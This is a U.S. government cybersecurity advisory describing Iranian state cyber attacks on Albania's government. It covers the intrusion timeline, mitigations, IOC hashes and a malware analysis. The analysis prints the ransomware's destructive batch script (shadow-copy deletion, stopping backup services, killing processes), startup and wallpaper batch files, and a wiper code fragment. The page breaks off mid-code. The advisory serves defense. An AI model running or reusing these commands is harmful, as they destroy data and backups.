{"markdown": "\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Iranian State Actors Conduct Cyber Operations Against the Government of Albania \\| CISA\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Skip to main content](#main) \n\n\n\n\n\n\n\n\n\n\n\n\n![U.S. flag](/profiles/cisad8_gov/themes/custom/gesso/dist/images/us_flag_small.png)\n\n\n\n An official website of the United States government\n \n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n Here\u2019s how you know\n \n\n\n\n\n\n\n![Dot gov](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-dot-gov.svg)\n\n\n**Official websites use .gov** \n  \n\n A\n **.gov** \n website belongs to an official government organization in the United States.\n \n\n\n\n\n\n![HTTPS](/profiles/cisad8_gov/themes/custom/gesso/dist/images/icon-https.svg)\n\n\n**Secure .gov websites use HTTPS** \n  \n\n A\n **lock** \n (\n \n\n\n Lock\n \n\n A locked padlock\n \n\n\n\n\n ) or\n **https://** \n means you\u2019ve safely connected to the .gov website. Share sensitive information only on official, secure websites.\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo Americas Cyber Defense Agency](/sites/default/files/images/SVG/header_logo_tagline_update.svg)](/)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n[![CISA Logo](/sites/default/files/images/SVG/mobile_logo_wordmark.svg)](/)\n\n\n\n\n\n\n\n\n\n\n Search\n \n\n\n\n\n\n\n\n\n\n Menu\n \n\n\n\n\n\n\n\n\n\n\n\n\n![America's Cyber Defense Agency](/sites/default/files/images/SVG/header_tagline_mobile_update.svg)\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Close\n \n\n\n\n\n* Topics\n \n\n\n\n[Topics](/topics) \n\n\n\n\n[Cybersecurity Best Practices](/topics/cybersecurity-best-practices)\n\n\n\n\n[Cyber Threats and Advisories](/topics/cyber-threats-and-advisories)\n\n\n\n\n[Critical Infrastructure Security and Resilience](/topics/critical-infrastructure-security-and-resilience)\n\n\n\n\n[Election Security](/topics/election-security)\n\n\n\n\n[Emergency Communications](/topics/emergency-communications)\n\n\n\n\n[Industrial Control Systems](/topics/industrial-control-systems)\n\n\n\n\n[Information and Communications Technology Supply Chain Security](/topics/information-communications-technology-supply-chain-security)\n\n\n\n\n[Partnerships and Collaboration](/topics/partnerships-and-collaboration)\n\n\n\n\n[Physical Security](/topics/physical-security)\n\n\n\n\n[Risk Management](/topics/risk-management)\n\n\n\n\n\n[How can we help?](/audiences) \n\n\n[Government](/topics/government) \n[Educational Institutions](/topics/educational-institutions) \n[Industry](/topics/industry) \n[State, Local, Tribal, and Territorial](/topics/state-local-tribal-and-territorial) \n[Individuals and Families](/topics/individuals-and-families) \n[Small and Medium Businesses](/topics/small-and-medium-businesses) \n[Find Help Locally](/audiences/find-help-locally) \n[Faith\\-Based Community](/audiences/faith-based-community) \n[Executives](/audiences/executives) \n[High\\-Risk Communities](/audiences/high-risk-communities)\n* [Spotlight](/spotlight)\n* Resources \\& Tools\n \n\n\n\n[Resources \\& Tools](/resources-tools) \n\n\n\n\n[All Resources \\& Tools](/resources-tools/all-resources-tools)\n\n\n\n\n[Services](/resources-tools/services)\n\n\n\n\n[Programs](/resources-tools/programs)\n\n\n\n\n[Resources](/resources-tools/resources)\n\n\n\n\n[Training](/resources-tools/training)\n\n\n\n\n[Groups](/resources-tools/groups)\n* News \\& Events\n \n\n\n\n[News \\& Events](/news-events) \n\n\n\n\n[News](/news-events/news)\n\n\n\n\n[Events](/news-events/events)\n\n\n\n\n[Cybersecurity Alerts \\& Advisories](/news-events/cybersecurity-advisories)\n\n\n\n\n[Directives](/news-events/directives)\n\n\n\n\n[Request a CISA Speaker](/news-events/request-speaker)\n\n\n\n\n[Congressional Testimony](/news-events/congressional-testimony)\n\n\n\n\n[CISA Conferences](/cisa-conferences)\n\n\n\n\n[CISA Live!](/cisa-live)\n* Careers\n \n\n\n\n[Careers](/careers) \n\n\n\n\n[Benefits \\& Perks](/careers/benefits-perks)\n\n\n\n\n[HireVue Applicant Reasonable Accommodations Process](/careers/hirevue-applicant-reasonable-accommodations-process)\n\n\n\n\n[Hiring](/general-recruitment-and-hiring-faqs)\n\n\n\n\n[Resume \\& Application Tips](/careers/resume-application-tips)\n\n\n\n\n[Students \\& Recent Graduates](/students-recent-graduates-employment-opportunities)\n\n\n\n\n[Veteran and Military Spouses](/careers/veteran-and-military-spouse-employment-opportunities)\n\n\n\n\n[Work @ CISA](/careers/work-cisa)\n* About\n \n\n\n\n[About](/about) \n\n\n\n\n[Culture](/about/culture)\n\n\n\n\n[Divisions \\& Offices](/about/divisions-offices)\n\n\n\n\n[Regions](/about/regions)\n\n\n\n\n[Leadership](/about/leadership)\n\n\n\n\n[Doing Business with CISA](/doing-business-cisa)\n\n\n\n\n[Site Links](/site-links)\n\n\n\n\n[Reporting Employee and Contractor Misconduct](/reporting-employee-and-contractor-misconduct)\n\n\n\n\n[CISA GitHub](/cisa-github)\n\n\n\n\n[CISA Central](/cisa-central)\n\n\n\n\n[2023 Year In Review](/about/2023YIR)\n\n\n\n\n[Contact Us](/about/contact-us)\n\n\n\n\n\n\n\n\n\n[Free Cyber Services](/resources-tools/resources/free-cybersecurity-services-and-tools \"Free Cyber Services\") \n[\\#protect2024](/protect2024) \n[Secure Our World](/node/18883) \n[Shields Up](/node/8056) \n[Report A Cyber Issue](/node/16591) \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Breadcrumb\n \n1. [Home](/)\n2. [News \\& Events](/news-events)\n3. [Cybersecurity Advisories](/news-events/cybersecurity-advisories)\n4. [Cybersecurity Advisory](/news-events/cybersecurity-advisories?f%5B0%5D=advisory_type%3A94)\n\n\n\n\n\n\n\n\n Share:\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n Cybersecurity Advisory\n \nIranian State Actors Conduct Cyber Operations Against the Government of Albania\n===============================================================================\n\n\n\n\n\n Last Revised\n \n\n\n September 23, 2022\n \n\n\n\n\n Alert Code\n \n\n AA22\\-264A\n \n\n\n\n\n\n\n\n\n\n\n\n\n\n\n### Summary\n\n\n\n\n The Federal Bureau of Investigation (FBI) and the Cybersecurity and Infrastructure Security Agency (CISA) are releasing this joint Cybersecurity Advisory to provide information on recent cyber operations against the Government of Albania in July and September. This advisory provides a timeline of activity observed, from initial access to execution of encryption and wiper attacks. Additional information concerning files used by the actors during their exploitation of and cyber attack against the victim organization is provided in Appendices A and B.\n \n\n\n\n In July 2022, Iranian state cyber actors\u2014identifying as \u201cHomeLand Justice\u201d\u2014launched a destructive cyber attack against the Government of Albania which rendered websites and services unavailable. A FBI investigation indicates Iranian state cyber actors acquired initial access to the victim\u2019s network approximately 14 months before launching the destructive cyber attack, which included a ransomware\\-style file encryptor and disk wiping malware. The actors maintained continuous network access for approximately a year, periodically accessing and exfiltrating e\\-mail content.\n \n\n\n\n Between May and June 2022, Iranian state cyber actors conducted lateral movements, network reconnaissance, and credential harvesting from Albanian government networks. In July 2022, the actors launched ransomware on the networks, leaving an anti\\-Mujahideen E\\-Khalq (MEK) message on desktops. When network defenders identified and began to respond to the ransomware activity, the cyber actors deployed a version of ZeroCleare destructive malware.\n \n\n\n\n In June 2022, HomeLand Justice created a website and multiple social media profiles posting anti\\-MEK messages. On July 18, 2022, HomeLand Justice claimed credit for the cyber attack on Albanian government infrastructure. On July 23, 2022, Homeland Justice posted videos of the cyber attack on their website. From late July to mid\\-August 2022, social media accounts associated with HomeLand Justice demonstrated a repeated pattern of advertising Albanian Government information for release, posting a poll asking respondents to select the government information to be released by HomeLand Justice, and then releasing that information\u2014either in a .zip file or a video of a screen recording with the documents shown.\n \n\n\n\n In September 2022, Iranian cyber actors launched another wave of cyber attacks against the Government of Albania, using similar TTPs and malware as the cyber attacks in July. These were likely done in retaliation for public attribution of the cyber attacks in July and severed diplomatic ties between Albania and Iran.\n \n\n\n\n Download the PDF version of this report:\n [pdf, 1221 kb](/sites/default/files/publications/aa22-264a-iranian-cyber-actors-conduct-cyber-operations-against-the-government-of-albania.pdf) \n\n\n\n\n Download the STIX file:\n [pdf, 44 KB](/sites/default/files/publications/AA22-264A.stix.xml) \n\n\n\n\n### Technical Details\n\n\n\n#### **Initial access**\n\n\n\n Timeframe: Approximately 14 months before encryption and wiper attacks.\n \n\n\n\n Details: Initial access was obtained via exploitation of an Internet\\-facing Microsoft SharePoint, exploiting CVE\\-2019\\-0604\\.\n \n\n\n#### Persistence and Lateral movement\n\n\n\n Timeframe: Approximately several days to two months after initial compromise.\n \n\n\n\n Details: After obtaining access to the victim environment, the actors used several .aspx webshells,\n `pickers.aspx` \n ,\n `error4.aspx` \n , and\n `ClientBin.aspx` \n , to maintain persistence. During this timeframe, the actors also used RDP (primarily), SMB, and FTP for lateral movement throughout the victim environment.\n \n\n\n#### Exchange Server compromise\n\n\n\n Timeframe: Approximately 1\\-6 months after initial compromise.\n \n\n\n\n Details: The actors used a compromised Microsoft Exchange account to run searches (via CmdLets New\\-MailboxSearch and Get\\-Recipient) on various mailboxes, including for administrator accounts. In this timeframe, the actors used the compromised account to create a new Exchange account and add it to the Organization Management role group.\n \n\n\n#### Likely Email exfiltration\n\n\n\n Timeframe: Approximately 8 months after initial compromise.\n \n\n\n\n Details: The actors made thousands of HTTP POST requests to Exchange servers of the victim organization. The FBI observed the client transferring roughly 70\\-160 MB of data, and the server transferring roughly 3\\-20 GB of data.\n \n\n\n#### VPN activity\n\n\n\n Timeframe: Approximately 12\\-14 months after initial compromise.\n \n\n\n\n Details: Approximately twelve months after initial access and two months before launching the destructive cyber attack, the actors made connections to IP addresses belonging to the victim organization\u2019s Virtual Private Network (VPN) appliance. The actors\u2019 activity primarily involved two compromised accounts. The actors executed the \u201cAdvanced Port Scanner\u201d (advanced\\_port\\_scanner.exe). The FBI also found evidence of Mimikatz usage and LSASS dumping.\n \n\n\n#### File Cryptor (ransomware\\-style file encryptor)\n\n\n\n Timeframe: Approximately 14 months after initial compromise.\n \n\n\n\n Details: For the encryption component of the cyber attack, the actor logged in to a victim organization print server via RDP and kicked off a process (Mellona.exe) which would propagate the GoXml.exe encryptor to a list of internal machines, along with a persistence script called win.bat. As deployed, GoXML.exe encrypted all files (except those having extensions .exe, .dll, .sys, .lnk, or .lck) on the target system, leaving behind a ransom note titled How\\_To\\_Unlock\\_MyFiles.txt in each folder impacted.\n \n\n\n#### Wiper attack\n\n\n\n Timeframe: Approximately 14 months after initial compromise.\n \n\n\n\n Details: In the same timeframe as the encryption attack, the actors began actions that resulted in raw disk drives being wiped with the Disk Wiper tool (cl.exe) described in Appendix A. Approximately over the next eight hours, numerous RDP connections were logged from an identified victim server to other hosts on the victim\u2019s network. Command line execution of cl.exe was observed in cached bitmap files from these RDP sessions on the victim server.\n \n\n\n\n### Mitigations\n\n\n\n\n FBI and CISA recommend organizations apply the following best practices to reduce risk of compromise:\n \n\n\n* **Ensure anti\\-virus and anti\\-malware software is enabled and signature definitions are updated** \n regularly and in a timely manner. Well\\-maintained anti\\-virus software may prevent use of commonly deployed cyber attacker tools that are delivered via spear\\-phishing.\n* **Adopt threat reputation services at the network device, operating system, application, and email service levels** \n . Reputation services can be used to detect or prevent low\\-reputation email addresses, files, URLs, and IP addresses used in spear\\-phishing attacks.\n* If your organization is employing certain types of software and appliances vulnerable to known Common Vulnerabilities and Exposures (CVEs),\n **ensure those vulnerabilities are patched** \n . Prioritize patching\n [known exploited vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) \n .\n* **Monitor for unusually large amounts of data** \n (i.e. several GB) being transferred from a Microsoft Exchange server.\n* **Check the host\\-based indications** \n , including webshells, for positive hits within your environment.\n* Maintain and test an incident response plan.\n* Ensure your organization has a vulnerability management program in place and that it prioritizes patch management and vulnerability scanning of\n [known exploited vulnerabilities](https://www.cisa.gov/known-exploited-vulnerabilities-catalog) \n . Note: CISA\u2019s\n [Cyber Hygiene Services](https://www.cisa.gov/cyber-hygiene-services) \n (CyHy) are free to all state, local, tribal, and territorial (SLTT) organizations, as well as public and private sector critical infrastructure organizations.\n* Properly configure and secure internet\\-facing network devices.\n\t+ Do not expose management interfaces to the internet.\n\t+ Disable unused or unnecessary network ports and protocols.\n\t+ Disable/remove unused network services and devices.\n* Adopt\n [zero\\-trust principles and architecture](https://www.cisa.gov/blog/2021/09/07/no-trust-no-problem-maturing-towards-zero-trust-architectures) \n , including:\n\t+ Micro\\-segmenting networks and functions to limit or block lateral movements.\n\t+ Enforcing phishing\\-resistant multifactor authentication (MFA) for all users and VPN connections.\n\t+ Restricting access to trusted devices and users on the networks.\n\n\n\n For more information on Iranian government\\-sponsored malicious cyber activity, see CISA's webpage \u2013\n [Iran Cyber Threat Overview and Advisories](https://www.us-cert.cisa.gov/iran) \n .\n \n\n\n### **Appendix A**\n\n\n\n**Host\\-based IOCs** \n\n\n\n\n\n\n*Additional details concerning some of these files are provided in Appendix B.* \n\n| File | MD5 Hash | Notes |\n| --- | --- | --- |\n| Error4\\.aspx | 81e123351eb80e605ad73268a5653ff3 | Webshell |\n| cl.exe | 7b71764236f244ae971742ee1bc6b098 | Wiper |\n| GoXML.exe | bbe983dba3bf319621b447618548b740 | Encryptor |\n| Goxml.jpg | 0738242a521bdfe1f3ecc173f1726aa1 |  |\n| ClientBin.aspx | a9fa6cfdba41c57d8094545e9b56db36 | Webshell (reverse\\-proxy connections) |\n| Pickers.aspx | 8f766dea3afd410ebcd5df5994a3c571 | Webshell |\n| evaluatesiteupgrade.cs.aspx | Unknown | Webshell |\n| mellona.exe | 78562ba0069d4235f28efd01e3f32a82 | Propagation for Encryptor |\n| win.bat | 1635e1acd72809479e21b0ac5497a79b | Launches GoXml.exe on startup |\n| win.bat | 18e01dee14167c1cf8a58b6a648ee049 | Changes desktop background to encryption image |\n| bb.bat | 59a85e8ec23ef5b5c215cd5c8e5bc2ab | Saves SAM and SYSTEM hives to C:\\\\Temp, makes cab archive |\n| disable\\_defender.exe | 60afb1e62ac61424a542b8c7b4d2cf01 | Disables Windows Defender |\n| rwdsk.sys | 8f6e7653807ebb57ecc549cef991d505 | Raw disk driver utilized by wiper malware |\n| App\\_Web\\_bckwssht.dll | e9b6ecbf0783fa9d6981bba76d949c94 |  |\n\n\n\n\n\n\n\n**Network\\-based IOCs** \n\n\n\n\n FBI review of Commercial VPN service IP addresses revealed the following resolutions (per Akamai data):\n \n\n\n\n\n| Country | Company |\n| --- | --- |\n| AL | KEMINET LTD. |\n| DE | NOOP\\-84\\-247\\-59\\-0\\-25 |\n| DE | GSL NETWORKS |\n| GB | LON\\-CLIENTS |\n| GB | GB\\-DATACENTER |\n| NL | NL\\-LAYERSWITCH\\-20190220 |\n| NL | PANQ\\-45\\-86\\-200\\-0 |\n| US | PRIVATE CUSTOMER |\n| US | BANDITO NETWORKS |\n| US | EXTERNAL |\n| US | RU\\-SELENA\\-20080725 |\n| US | TRANS OCEAN NETWORK |\n\n\nAppendix B\n----------\n\n\n### Ransomware Cryptor\n\n\n\n`GoXML.exe` \n is a ransomware style file encryptor. It is a Windows executable, digitally signed with a certificate issued to the Kuwait Telecommunications Company KSC, a subsidiary of Saudi Telecommunications Company (STC).\n \n\n\n\n If executed with five or more arguments (the arguments can be anything, as long as there are five or more), the program silently engages its file encryption functionality. Otherwise, a file\\-open dialog Window is presented, and any opened documents receive an error prompt labeled,\n `Xml Form Builder.` \n\n\n\n\n All internal strings are encrypted with a hard coded RC4 key. Before internal data is decrypted, the string decryption routine has a built\\-in self\\-test that decrypts a DWORD value and tests to see if the plaintext is the string\n `yes` \n . If so, it will continue to decode its internal strings.\n \n\n\n\n The ransomware will attempt to launch the following batch script; however, this will fail due to a syntax error.\n \n\n\n\n\n| @for /F \"skip\\=1\" %C in ('wmic LogicalDisk get DeviceID') do (@wmic /namespace:\\\\\\\\root\\\\default Path SystemRestore Call disable \"%C\\\\\" \\& @rd /s /q %C\\\\$Recycle.bin)     @vssadmin.exe delete shadows /all /quiet     @set SrvLst\\=vss sql svc$ memtas mepos sophos veeam backup GxVss GxBlr GxFWD GxCVD GxCIMgr DefWatch ccEvtMgr ccSetMgr SavRoam RTVscan QBFCService QBIDPService ntuit.QuickBooks.FCS QBCFMonitorService YooBackup YooIT zhudongfangyu sophos stc\\_raw\\_agent VSNAPVSS VeeamTransportSvc VeeamDeploymentService VeeamNFSSvc veeam PDVFSService BackupExecVSSProvider BackupExecAgentAccelerator BackupExecAgentBrowser BackupExecDiveciMediaService BackupExecJobEngine BackupExecManagementService BackupExecRPCService AcrSch2Svc AcronisAgent CASAD2DWebSvc CAARCUpdateSvc     @for %C in (%SrvLst%) do @net stop %C     @set SrvLst\\=     @set PrcLst\\=mysql sql oracle ocssd dbsnmp synctime agntsvc isqlplussvc xfssvccon mydesktopservice ocautoupds encsvc tbirdconfig mydesktopqos ocomm dbeng50 sqbcoreservice excel infopath msaccess mspub onenote outlook powerpnt steam thebat thunderbird visio winword wordpad notepad     @for %C in (%PrcLst%) do @taskkill /f /im \"%C.exe\"     @set PrcLst\\=     @exit |\n| --- |\n\n\n\n\n\n\n\n The syntax error consists of a missing backslash that separates\n `system32` \n and\n `cmd.exe` \n , so the process is launched as\n `system32cmd.exe` \n which is an invalid command.\n \n\n\n\n\n\n\n\n\n![]()\n\n\n\n\n Script Launch Bug\n \n\n\n\n\n\n\n\n\n The ransomware\u2019s file encryption routine will generate a random string, take the MD5 hash and use that to generate an RC4 128 key which is used to encrypt files. This key is encrypted with a hard coded Public RSA key and converted to Base64 utilizing a custom alphabet. This is appended to the end of the ransom note.\n \n\n\n\n The cryptor places a file called\n `How_To_Unlock_MyFiles.txt` \n in directories with encrypted files.\n \n\n\n\n Each encrypted file is given the\n `.lck` \n extension and the contents of each file are only encrypted up to\n `0x100000` \n or 1,048,576 bytes which is a hard coded limit.\n \n\n\n\n Separately, the actor ran a batch script (win.bat below) to set a specific desktop background.\n \n\n\n### File Details\n\n\n\n\n| GoXml.exe | |\n| --- | --- |\n| File Size: | 43\\.48 KB (44520 bytes) |\n| SHA256: | f116acc6508843f59e59fb5a8d643370dce82f492a217764521f46a856cc4cb5 |\n| SHA1: | 5d117d8ef075f3f8ed1d4edcc0771a2a0886a376 |\n| MD5: | bbe983dba3bf319621b447618548b740 |\n| SSDeep: | 768:\\+OFu8Q3w6QzfR5Jni6SQD7qSFDs6P93/q0XIc/UB5EPABWX     :RFu8QAFzffJui79f13/AnB5EPAkX (Ver 1\\.1\\) |\n| File Type: | PE32 executable (GUI) Intel 80386 (stripped to external PDB), for MS Windows |\n| PE Header Timestamp: | 2016\\-04\\-30 17:08:19 |\n| ImpHash: | 5b2ce9270beea5915ec9adbcd0dbb070 |\n| Cert \\#0 Subject C\\=KW, L\\=Salmiya, O\\=Kuwait Telecommunications Company KSC, OU\\=Kuwait Telecommunications Company, CN\\=Kuwait Telecommunications Company KSC     Cert \\#0 Issuer\u00a0 C\\=US, O\\=DigiCert Inc, OU\\=www.digicert.com, CN\\=DigiCert SHA2 Assured ID Code Signing CA     Cert \\#0 SHA1\u00a0\u00a0\u00a0 55d90ec44b97b64b6dd4e3aee4d1585d6b14b26f | |\n\n\n\n\n\n\n\n\n| win.bat (\\#1, run malware) | |\n| --- | --- |\n| File Size: | 67 bytes |\n| SHA256: | bad65769c0b416bb16a82b5be11f1d4788239f8b2ba77ae57948b53a69e230a6 |\n| SHA1: | 14b8c155e01f25e749a9726958606b242c8624b9 |\n| MD5: | 1635e1acd72809479e21b0ac5497a79b |\n| SSDeep: | 3:LjTFKCkRErG\\+fyM1KDCFUF82G:r0aH1\\+DF82G (Ver 1\\.1\\) |\n| File Type: | ASCII text, with no line terminators |\n| Contents: | start /min C:\\\\ProgramData\\\\Microsoft\\\\Windows\\\\GoXml.exe 1 2 3 4 5 6 7 |\n\n\n\n\n\n\n\n\n| win.bat (\\#2, install desktop image) | |\n| --- | --- |\n| Filename: | ec4cd040fd14bff86f6f6e7ba357e5bcf150c455532800edf97782836e97f6d2 |\n| File Size: | 765 bytes |\n| SHA256: | ec4cd040fd14bff86f6f6e7ba357e5bcf150c455532800edf97782836e97f6d2 |\n| SHA1: | fce0db6e66d227d3b82d4564446ede0c0fd7598c |\n| MD5: | 18e01dee14167c1cf8a58b6a648ee049 |\n| SSDeep: | 12:wbYVJ69/TsdLd6sdLd3mTDwfV\\+EVTCuwfV\\+EVTCuwfV\\+EVTCuwfV\\+EVTCuwfV     \\+Et:wq69/kZxZ3mTDY9HY9HY9HY9HY9j (Ver 1\\.1\\) |\n| File Type: | DOS batch file text, ASCII text, with CRLF line terminators |\n| Contents:     @echo off     setlocal enabledelayedexpansion     set \"Wtime\\=!time:\\~0,2!\"     if \"!Wtime!\" leq \"20\" reg add \"HKEY\\_CURRENT\\_USER\\\\Control Panel\\\\Desktop\" /v Wallpaper /t REG\\_SZ /d \"c:\\\\programdata\\\\GoXml.jpg\" /f \\& goto done     if \"!Wtime!\" geq \"20\" reg add \"HKEY\\_CURRENT\\_USER\\\\Control Panel\\\\Desktop\" /v Wallpaper /t REG\\_SZ /d \"c:\\\\programdata\\\\GoXml.jpg\" /f \\& goto done     :done     timeout /t 5 \\>nul     start \"\" /b RUNDLL32\\.EXE user32\\.dll,UpdatePerUserSystemParameters ,1 ,True     start \"\" /b RUNDLL32\\.EXE user32\\.dll,UpdatePerUserSystemParameters ,1 ,True     start \"\" /b RUNDLL32\\.EXE user32\\.dll,UpdatePerUserSystemParameters ,1 ,True     start \"\" /b RUNDLL32\\.EXE user32\\.dll,UpdatePerUserSystemParameters ,1 ,True     start \"\" /b RUNDLL32\\.EXE user32\\.dll,UpdatePerUserSystemParameters ,1 ,True     endlocal | |\n\n\n\n\n\n\n\n\n| goxml.jpg | |\n| --- | --- |\n| File Size: | 1\\.2 MB (1259040 bytes) |\n| SHA256: | 63dd02c371e84323c4fd9a161a75e0f525423219e8a6ec1b95dd9eda182af2c9 |\n| SHA1: | 683eaec2b3bb5436f00b2172e287dc95e2ff2266 |\n| MD5: | 0738242a521bdfe1f3ecc173f1726aa1 |\n| SSDeep: | 12288:ME0p1RE70zxntT/ylTyaaSMn2fS\\+0M6puxKfJbDKrCxMe5fPSC2tmx     VjpJT/n37p:MHyUt7yQaaPXS6pjar\\+MwrjpJ7VIbZg (Ver 1\\.1\\) |\n| File Type: | JPEG image data, Exif standard: \\[TIFF image data, big\\-endian, direntries\\=13, height\\=1752, bps\\=0, PhotometricIntepretation\\=CMYK, orientation\\=upper\\-left, width\\=2484TIFF image data, big\\-endian, direntries\\=13, height\\=1752, bps\\=0, PhotometricIntepretation\\=CMYK, orientation\\=upper\\-left, width\\=2484], progressive, precision 8, 2484x1752, components 4 |\n| Software: | Adobe Photoshop 22\\.4 (Windows) |\n| Modify Date: | 2022\\-07\\-13 20:45:20 |\n| Create Date: | 2020\\-06\\-11 02:13:33 |\n| Metadata Date: | 2022\\-07\\-13 20:45:20 |\n| Profile Date Time: | 2000\\-07\\-26 05:41:53 |\n| Image Size: | 2484x1752 |\n| File Size: | 1\\.2 MB (1259040 bytes) |\n| SHA256: | 63dd02c371e84323c4fd9a161a75e0f525423219e8a6ec1b95dd9eda182af2c9 |\n\n\n### Disk Wiper\n\n\n\n The files\n `cl.exe` \n and\n `rwdsk.sys` \n are part of a disk wiper utility that provides raw access to the hard drive for the purposes of wiping data. From the command line the cl.exe file accepts the arguments:\n \n\n\n* `in`\n* `un`\n* `wp <optional argument>`\n\n\n\n If executed with the\n `in` \n command, the utility will output\n `in start!` \n and installs a hard coded file named rwdsk.sys as a service named\n `RawDisk3` \n . The\n `.SYS` \n file is not extracted from the installer however, but rather the installer looks for the file in the same directory that the\n `cl.exe` \n is executed in.\n \n\n\n\n![]()\n\n\n\n\n![]()\n\n\n\n\n*It will also load the driver after installation* \n .\n \n\n\n\n![]()\n![]()\n\n\n\n\n The\n `un` \n command uninstalls the service, outputting the message\n `\u201cun start!\u201d` \n to the terminal.\n   \n\n  \n\n The\n `wp` \n command will access the loaded driver for raw disk access.\n \n\n\n\n\n\n\n\n\n![]()\n\n\n\n\n Raw Disk Access\n \n\n\n\n\n The long hexadecimal string is hard coded in the\n `cl.exe` \n binary.\n \n\n\n\n\n| RawDisk3File \\= (void \\*)toOpenRawDisk3File(     arg2\\_WideCharStr,     0xC0000000,     L\"B4B615C28CCD059CF8ED1ABF1C71FE03C0354522990AF63ADF3C911E2287A4B906D47D\");     ptrRawDiskFile \\= RawDisk3File;     if ( RawDisk3File )     {     sizeDisk \\= toGetDiskSize(RawDisk3File);     terminal\\_out(\"Total Bytez : %lld\\\\n\", sizeDisk \\<\\< 9\\); |\n| --- |\n\n\n\n The\n `wp` \n command also takes an additional argument as a device path to place after\n `\\RawDisk3\\` \n in the output string. It is uncertain what creates this path to a device as the driver tested did not.\n \n\n\n\n The output is \u201cwp starts!\u201d followed by the total bytes of the drive and the time the wipe operation takes.\n \n\n\n\n If the registry key value HKLM\\\\SOFTWARE\\\\EldoS\\\\EventLog is set to \u201cEnabled\u201d, the install will generate an event log if at any time the install produces an error. This log contains an error code DWORD followed by the string ..\\\\..\\\\DriverLibraries\\\\DrvSupLib\\\\install.c. If the system does not have the SOFTWARE\\\\EldoS key, no event logs would be produced. This feature must be a related to the legitimate EldoS utility.\n \n\n\n\n![]()\n\n\n\n\n rwdsk.sys is a \u201clegitimate commercial driver from the EldoS Corporation that is used for interacting with files, disks, and partitions. The driver allows for direct modification of data on a local computer\u2019s hard drive. In some cases, the tool can enact these raw disk modifications from user\\-mode processes, circumventing Windows operating system security features.\"https://attack.mitre.org/software/S0364/\n \n\n\n#### File Details\n\n\n\n\n| cl.exe |  |\n| --- | --- |\n| File Size | 142\\.5 KB (145920 bytes) |\n| SHA256 | e1204ebbd8f15dbf5f2e41dddc5337e3182fc4daf75b05acc948b8b965480ca0 |\n| SHA1 | f22a7ec80fbfdc4d8ed796119c76bfac01e0a908 |\n| MD5 | 7b71764236f244ae971742ee1bc6b098 |\n| SSDeep | 3072:vv2ADi7yOcE/YMBSZ0fZX4kpK1OhJrDwM:vv2jeQ/flfZbKM (Ver 1\\.1\\) |\n| Filetype | PE32\\+ executable (console) x86\\-64, for MS Windows |\n| PE Header Timestamp | 2022\\-07\\-15 13:26:28 |\n| ImpHash | 58d51c1152817ca3dec77f2eee52cbef |\n\n\n\n\n\n\n\n\n| rwdsk.sys |  |\n| --- | --- |\n| File Size | 38\\.84 KB (39776 bytes) |\n| SHA256 | 3c9dc8ada56adf9cebfc501a2d3946680dcb0534a137e2e27a7fcb5994cd9de6 |\n| SHA1 | 5e061701b14faf9adec9dd0b2423ff3cfc18764b |\n| MD5 | 8f6e7653807ebb57ecc549cef991d505 |\n| SSDeep | 768:E31ySCpoCbXnfDbEaJSooKIDyE9aBazWlEAusxsia:0gyCb3MFKIHO4Ausxta (Ver 1\\.1\\) |\n| Filetype | PE32\\+ executable (native) x86\\-64, for MS Windows |\n| PEtype | Driver |\n| PE Header Timestamp | 2016\\-03\\-18 14:44:54 |\n| ImpHash | e233f2cdc91faafe1467d9e52f166213 |\n| Cert \\#0 Subject | CN\\=VeriSign Time Stamping Services CA, O\\=VeriSign, Inc., C\\=US |\n| Cert \\#0 Issuer | CN\\=VeriSign Time Stamping Services CA, O\\=VeriSign, Inc., C\\=US |\n| Cert \\#0 SHA1 | 382c18388fb326221dfd7a77ee874f9ba60e04bf |\n| Cert \\#1 Subject | C\\=US, ST\\=California, L\\=SANTA CLARA, O\\=NVIDIA Corporation, CN\\=NVIDIA Corporation |\n| Cert \\#1 Issuer | C\\=US, O\\=VeriSign, Inc., OU\\=VeriSign Trust Network, OU\\=Terms of use at https://www.verisign.com/rpa (c)10, CN\\=VeriSign Class 3 Code Signing 2010 CA |\n| Cert \\#1 SHA1 | 30632ea310114105969d0bda28fdce267104754f |\n| Cert \\#2 Subject | C\\=US, O\\=VeriSign, Inc., OU\\=VeriSign Trust Network, OU\\=(c) 2006 VeriSign, Inc.\u00a0\\- For authorized use only, CN\\=VeriSign Class 3 Public Primary Certification Authority \\- G5 |\n| Cert \\#2 Issuer | C\\=US, ST\\=Washington, L\\=Redmond, O\\=Microsoft Corporation, CN\\=Microsoft Code Verification Root |\n| Cert \\#2 SHA1 | 57534ccc33914c41f70e2cbb2103a1db18817d8b |\n| Cert \\#3 Subject | C\\=US, O\\=VeriSign, Inc., OU\\=VeriSign Trust Network, OU\\=Terms of use at https://www.verisign.com/rpa (c)10, CN\\=VeriSign Class 3 Code Signing 2010 CA |\n| Cert \\#3 Issuer | C\\=US, O\\=VeriSign, Inc., OU\\=VeriSign Trust Network, OU\\=(c) 2006 VeriSign, Inc.\u00a0\\- For authorized use only, CN\\=VeriSign Class 3 Public Primary Certification Authority \\- G5 |\n| Cert \\#3 SHA1 | 495847a93187cfb8c71f840cb7b41497ad95c64f |\n\n\n\n\n\n\n### Additional Files\n\n\n#### *Web Deployed Reverse Proxy*\n\n\n#### Description\n\n\n\n ClientBin.aspx is an ASP file that contains a Base64 encoded .Net executable (App\\_Web\\_bckwssht.dll) that it decodes and loads via Reflection. The .Net executable contains Class and Method obfuscation and internal strings are encoded with a single byte XOR obfuscation.\n \n\n\n\n\n public static string hair\\_school\\_bracket()\n   \n\n  \n\n {\n   \n\n  \n\n 